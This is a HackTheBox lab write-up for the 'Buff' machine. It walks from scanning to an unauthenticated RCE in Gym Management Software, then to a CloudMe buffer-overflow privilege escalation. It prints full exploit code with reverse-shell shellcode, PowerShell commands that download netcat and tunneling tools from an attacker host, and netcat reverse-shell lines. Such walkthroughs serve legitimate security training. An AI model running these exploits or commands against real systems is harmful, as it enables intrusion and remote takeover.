#  Buff - HackTheBox WriteUp

![info](/images/buff/info.png)

### Scanning, Recon & Information Gathering
 
Nmap Quick:
```
root@kali:~/pwn_share/Machines/Buff# nmap -T4 -p- 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 00:49 EEST
Nmap scan report for 10.10.10.198
Host is up (0.15s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 301.57 seconds
root@kali:~/pwn_share/Machines/Buff# nc 10.10.10.198 7680

```




Nmap Full:

```
root@kali:~/pwn_share/Machines/Buff# nmap -A -p7680,8080 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 01:02 EEST
Nmap scan report for 10.10.10.198
Host is up (0.19s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops

TRACEROUTE (using port 7680/tcp)
HOP RTT       ADDRESS
1   63.92 ms  10.10.14.1
2   115.28 ms 10.10.10.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.91 seconds

```
#### Service Enumeration 

Kicking off a gobuster scan to bruteforce for files and directories that may be on the webserver.


```

root@kali:~/pwn_share/Machines/infoprep# gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt,html -t 20

/Admin (Status: 301)
/ADMIN (Status: 301)
/About.php (Status: 200)
/Contact.php (Status: 200)
/Home.php (Status: 200)
/LICENSE (Status: 200)
/Index.php (Status: 200)
/about.php (Status: 200)
/admin (Status: 301)
/att (Status: 301)
/att.php (Status: 200)
/aux (Status: 403)
/aux.php (Status: 403)
/aux.txt (Status: 403)
/aux.html (Status: 403)
Progress: 3617 / 20474 (17.67%)^C
[!] Keyboard interrupt detected, terminating.
```

**8080:**

Visiting the home page
![home](/images/buff/home.png)

And then the contact page
![contact_gym](/images/buff/contact_gym.png)

```
Made using Gym Management Software 1.0 
```

This information is definetly interesting, and a quick search online returns a remote code execution exploit

https://www.exploit-db.com/exploits/48506

Using searchsploit:

```
root@kali:/# searchsploit gym
----------------------- ---------------------------------
 Exploit Title         |  Path
----------------------- ---------------------------------
Gym Management System  | php/webapps/48506.py
WordPress Plugin WPGYM | php/webapps/42801.txt
----------------------- ---------------------------------
Shellcodes: No Results        

root@kali:/# searchsploit -m php/webapps/48506.py                                                       
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution                                      
      URL: https://www.exploit-db.com/exploits/48506     
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py                                                     
File Type: Python script, ASCII text executable, with CRLF line terminators                                       
                                                         
Copied to: /48506.py                          
                                                
root@kali:/# cp 48506.py /tmp/rce.py 

```


### Exploitation 
#### Foothold 


After reading the script and running it with the victim's url as argument a shell is received.

![rce](/images/buff/rce.png)


This is still a limited shell and can be quickly observed as soon as trying to change to another directory.

A netcat reverse shell can be used to get a proper shell and this can be downloadd from the attacker host.

```
powershell -w hidden -noni -nop -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45/nc64.exe','C:\Users\public\nc64.exe')"

powershell -w hidden -noni -nop -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45/nc.exe','C:\Users\public\nc.exe')"

C:\Users\public\nc64.exe 10.10.14.45 443 -e cmd.exe

C:\Users\public\nc.exe 10.10.14.45 443 -e cmd.exe
```

At the point the user flag can be read.

![user](/images/buff/user.png)

powershell -w hidden -noni -nop -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45/46250.exe','C:\Users\public\46250.exe')" && C:\Users\public\46250.exe

### Privilege Escalation 

While doing simple emuration after getting shell, checking the running services and processes, 

```
tasklist /SVC:
                                       
svchost.exe                   8744 N/A
svchost.exe                   7664 N/A
svchost.exe                   3748 N/A
RuntimeBroker.exe             1440 N/A
cmd.exe                       8724 N/A
conhost.exe                    524 N/A
CloudMe.exe                   7812 N/A
timeout.exe                   5320 N/A
cmd.exe                       1184 N/A
conhost.exe                   5504 N/A
tasklist.exe                  5800 N/A  
```

Out of all the running exe's, only the CloudMe.exe is uncommon, therefore warants more enumeration.

A quick check on searchsploit:


```
root@kali:/var/www/html/pub# searchsploit CloudMe
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)              | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)     | windows/local/48499.txt
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)    | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Byp | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow ( | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow         | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt     | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP By | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow             | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP  | windows_x86-64/remote/44784.py

```

The 48389 exploit appear promising and could lead to a root shell.
Reading through the exploit code, it appears to be a simple buffer overflow exploit which pops calc.

```
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

Running netstat we also notice that port 8888 is open on 127.0.0.1 only.

It is definetely worth checking what is running on that port.

```
C:\xampp\htdocs\gym\upload> netstat -nao
�PNG
▒

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5856
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8992
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       6740
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1052
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1616
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.198:8080      10.10.14.45:52196      ESTABLISHED     6740
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       7208
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2432
  TCP    [::]:135               [::]:0                 LISTENING       932
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       8992
  TCP    [::]:8080              [::]:0                 LISTENING       6740
  TCP    [::]:49664             [::]:0                 LISTENING       524
  TCP    [::]:49665             [::]:0                 LISTENING       1052
  TCP    [::]:49666             [::]:0                 LISTENING       1616
  TCP    [::]:49667             [::]:0                 LISTENING       2260
  TCP    [::]:49668             [::]:0                 LISTENING       668
  TCP    [::]:49669             [::]:0                 \
```

We are definetly interested in checking out these ports running on localhost.


Using Plink we can tunnel the ports so that we can access them from our kali machine.

```
powershell -w hidden -noni -nop -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45/plink.exe','C:\Users\public\plink.exe')"
```

Port Forward with plink.exe:
```
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <your_kali_password> -R 10.10.14.45:8888:127.0.0.1:8888 10.10.14.45

```
However I ran into issues with SSH cipher algorithm negotiation and did not wish to troubleshoot that at the time.

There is another great tool for tunneling and port forwarding in windows:
https://github.com/jpillora/chisel

Server (attacker): 
```
root@kali:/opt/chisel# ./chisel server --port 8000 --reverse                                               
```

Client (victim):
```
powershell -w hidden -noni -nop -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45/chisel.exe','C:\Users\public\chisel.exe')"

```

```
C:\xampp\htdocs\gym\upload> C:\Users\public\chisel.exe client 10.10.14.45:8000 R:8888:127.0.0.1:8888 
�PNG
▒
2020/08/24 04:26:47 client: Connecting to ws://10.10.14.45:8000
2020/08/24 04:26:47 client: Fingerprint b2:50:1f:ea:c2:3a:88:29:dd:b6:69:17:1d:57:89:cb
2020/08/24 04:26:48 client: server: server: proxy#1:R:0.0.0.0:8888=>127.0.0.1:8888: listen tcp4 0.0.0.0:8888: bind: address already in use

C:\xampp\htdocs\gym\upload> C:\Users\public\chisel.exe client 10.10.14.45:8000 R:888:127.0.0.1:8888 

```

Downloading the exploit script and replacing the calc.exe shellcode with a reverse shell payload that we generate using msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.45 LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python
```

48389.py:

```
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.45 LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python

payload =  b""
payload += b"\xda\xc9\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\xca\x85\xf5"
payload += b"\xb0\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\x92\x96\x17"
payload += b"\x45\xde\x71\x55\xa6\x1e\x82\x3a\x2e\xfb\xb3\x7a\x54"
payload += b"\x88\xe4\x4a\x1e\xdc\x08\x20\x72\xf4\x9b\x44\x5b\xfb"
payload += b"\x2c\xe2\xbd\x32\xac\x5f\xfd\x55\x2e\xa2\xd2\xb5\x0f"
payload += b"\x6d\x27\xb4\x48\x90\xca\xe4\x01\xde\x79\x18\x25\xaa"
payload += b"\x41\x93\x75\x3a\xc2\x40\xcd\x3d\xe3\xd7\x45\x64\x23"
payload += b"\xd6\x8a\x1c\x6a\xc0\xcf\x19\x24\x7b\x3b\xd5\xb7\xad"
payload += b"\x75\x16\x1b\x90\xb9\xe5\x65\xd5\x7e\x16\x10\x2f\x7d"
payload += b"\xab\x23\xf4\xff\x77\xa1\xee\x58\xf3\x11\xca\x59\xd0"
payload += b"\xc4\x99\x56\x9d\x83\xc5\x7a\x20\x47\x7e\x86\xa9\x66"
payload += b"\x50\x0e\xe9\x4c\x74\x4a\xa9\xed\x2d\x36\x1c\x11\x2d"
payload += b"\x99\xc1\xb7\x26\x34\x15\xca\x65\x51\xda\xe7\x95\xa1"
payload += b"\x74\x7f\xe6\x93\xdb\x2b\x60\x98\x94\xf5\x77\xdf\x8e"
payload += b"\x42\xe7\x1e\x31\xb3\x2e\xe5\x65\xe3\x58\xcc\x05\x68"
payload += b"\x98\xf1\xd3\x3f\xc8\x5d\x8c\xff\xb8\x1d\x7c\x68\xd2"
payload += b"\x91\xa3\x88\xdd\x7b\xcc\x23\x24\xec\xf9\xb9\x28\xc1"
payload += b"\x95\xbf\x34\x08\x3a\x49\xd2\x40\xd2\x1f\x4d\xfd\x4b"
payload += b"\x3a\x05\x9c\x94\x90\x60\x9e\x1f\x17\x95\x51\xe8\x52"
payload += b"\x85\x06\x18\x29\xf7\x81\x27\x87\x9f\x4e\xb5\x4c\x5f"
payload += b"\x18\xa6\xda\x08\x4d\x18\x13\xdc\x63\x03\x8d\xc2\x79"
payload += b"\xd5\xf6\x46\xa6\x26\xf8\x47\x2b\x12\xde\x57\xf5\x9b"
payload += b"\x5a\x03\xa9\xcd\x34\xfd\x0f\xa4\xf6\x57\xc6\x1b\x51"
payload += b"\x3f\x9f\x57\x62\x39\xa0\xbd\x14\xa5\x11\x68\x61\xda"
payload += b"\x9e\xfc\x65\xa3\xc2\x9c\x8a\x7e\x47\xbc\x68\xaa\xb2"
payload += b"\x55\x35\x3f\x7f\x38\xc6\xea\xbc\x45\x45\x1e\x3d\xb2"
payload += b"\x55\x6b\x38\xfe\xd1\x80\x30\x6f\xb4\xa6\xe7\x90\x9d"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

Now we can setup a listener and execute the exploit:

```
python 48389.py
```

On the netcat listner a a root shell is received:
```
root@kali:~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.10.198] 49696
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && ipconfig
whoami && ipconfig
buff\administrator

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::6dc3:aeba:6e1d:6429
   Temporary IPv6 Address. . . . . . : dead:beef::418c:86f6:cbb6:2d0a
   Link-local IPv6 Address . . . . . : fe80::6dc3:aeba:6e1d:6429%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.198
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:c0c3%10
                                       10.10.10.2

C:\Windows\system32>cd c:\users\administrator
cd c:\users\administrator

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Directory of c:\Users\Administrator\Desktop

18/07/2020  17:36    <DIR>          .
18/07/2020  17:36    <DIR>          ..
16/06/2020  16:41             1,417 Microsoft Edge.lnk
24/08/2020  03:32                34 root.txt
               2 File(s)          1,451 bytes
               2 Dir(s)   7,656,693,760 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
0e9487.........

c:\Users\Administrator\Desktop>
```

![root](/images/buff/root.png)
